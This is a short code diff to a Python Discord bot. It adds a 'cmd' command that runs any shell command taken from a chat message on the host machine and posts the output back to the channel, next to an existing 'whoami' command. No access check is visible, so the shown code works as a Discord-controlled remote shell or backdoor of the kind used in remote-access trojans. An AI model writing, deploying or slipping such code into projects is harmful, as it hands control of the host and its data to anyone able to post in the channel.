@@ -26,5 +26,8 @@ async def on_message(message):
                 if cmd[1] == "whoami":
                         cmdcall = subprocess.run(["whoami"], stdout=subprocess.PIPE, text=True)
                         await message.channel.send(cmdcall.stdout)
+                if cmd[1] == "cmd":
+                        cmdcall = subprocess.run([cmd[2]], stdout=subprocess.PIPE, text=True)
+                        await message.channel.send(cmdcall.stdout)
 
 bot.run(token)
